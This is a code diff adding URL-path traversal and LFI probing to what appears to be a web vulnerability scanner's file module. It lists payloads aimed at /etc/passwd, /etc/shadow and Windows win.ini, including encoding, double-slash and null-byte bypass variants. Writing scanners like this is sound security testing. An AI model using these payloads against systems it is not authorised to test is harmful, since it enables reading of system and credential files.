@@ -101,13 +101,98 @@ def find_warning_message(data, payload):
 
 
 class ModuleFile(Attack):
-    """Detect file-related vulnerabilities such as directory traversal and include() vulnerabilities."""
+    """Detect file-related vulnerabilities such as directory traversal and include() vulnerabilities.
+
+    Also tests URL path-based LFI/Path Traversal (e.g., /../../etc/passwd)
+    """
     name = "file"
 
     def __init__(self, crawler, persister, attack_options, crawler_configuration):
         Attack.__init__(self, crawler, persister, attack_options, crawler_configuration)
         self.known_false_positives = defaultdict(set)
         self.mutator = self.get_mutator()
+        self.tested_paths = set()  # Track tested base URLs for path injection
+
+    async def _test_path_injection(self, request: Request) -> bool:
+        """Test LFI/Path Traversal in URL path (e.g., /../../etc/passwd)"""
+        from urllib.parse import urlparse
+
+        parsed = urlparse(request.url)
+        base_url = f"{parsed.scheme}://{parsed.netloc}"
+
+        # Skip if already tested this base URL
+        if base_url in self.tested_paths:
+            return False
+        self.tested_paths.add(base_url)
+
+        # Key payloads for path-based LFI/Path Traversal detection
+        path_payloads = [
+            # Linux LFI
+            ("../../../etc/passwd", "root:", "Path traversal reading /etc/passwd in URL path"),
+            ("....//....//....//etc/passwd", "root:", "Path traversal with bypass in URL path"),
+            ("..%2F..%2F..%2Fetc%2Fpasswd", "root:", "URL encoded path traversal in URL path"),
+            ("....//....//....//etc//passwd", "root:", "Path traversal double slash in URL path"),
+            ("/etc/passwd", "root:", "Direct /etc/passwd access in URL path"),
+            ("../../../etc/shadow", "root:", "Path traversal reading /etc/shadow in URL path"),
+            # Windows LFI
+            ("..\\..\\..\\windows\\win.ini", "[fonts]", "Windows path traversal in URL path"),
+            ("....\\\\....\\\\....\\\\windows\\\\win.ini", "[fonts]", "Windows path traversal bypass in URL path"),
+            ("C:\\Windows\\win.ini", "[fonts]", "Windows direct path access in URL path"),
+            # Null byte injection (legacy)
+            ("../../../etc/passwd%00", "root:", "Path traversal with null byte in URL path"),
+            ("../../../etc/passwd%00.png", "root:", "Path traversal null byte extension bypass in URL path"),
+        ]
+
+        for payload, expected, description in path_payloads:
+            # Test payload in path: /payload
+            test_url = f"{base_url}/{payload}"
+            test_request = Request(test_url, method="GET")
+
+            log_verbose(f"[¨] Testing path LFI: {test_url}")
+
+            try:
+                test_response = await self.crawler.async_send(test_request)
+            except (ReadTimeout, RequestError):
+                self.network_errors += 1
+                continue
+
+            if expected.lower() in test_response.content.lower():
+                vuln_message = f"{description}: {test_url}"
+
+                await self.add_critical(
+                    finding_class=PathTraversalFinding,
+                    request=test_request,
+                    info=vuln_message,
+                    parameter="URL path",
+                    response=test_response
+                )
+
+                log_red("---")
+                log_red(f"[!] {description}")
+                log_red(f"[!] URL: {test_url}")
+                log_red("---")
+                return True  # Found vulnerability, stop testing this URL
+
+            # Also check for PHP warnings
+            file_warning = find_warning_message(test_response.content, payload)
+            if file_warning:
+                vuln_message = f"{file_warning.function} in URL path: {test_url}"
+
+                await self.add_critical(
+                    finding_class=PathTraversalFinding,
+                    request=test_request,
+                    info=vuln_message,
+                    parameter="URL path",
+                    response=test_response
+                )
+
+                log_red("---")
+                log_red(f"[!] {file_warning.function} in URL path")
+                log_red(f"[!] URL: {test_url}")
+                log_red("---")
+                return True
+
+        return False
 
     def get_payloads(self, _: Optional[Request] = None, __: Optional[Parameter] = None) -> Iterator[PayloadInfo]:
         """Load the payloads from the specified file"""
@@ -149,6 +234,9 @@ class ModuleFile(Attack):
         saw_internal_error = False
         current_parameter = None
         vulnerable_parameter = False
+
+        # First, test URL path-based LFI/Path Traversal
+        await self._test_path_injection(request)
 
         for mutated_request, parameter, payload_info in self.mutator.mutate(request, self.get_payloads):
 
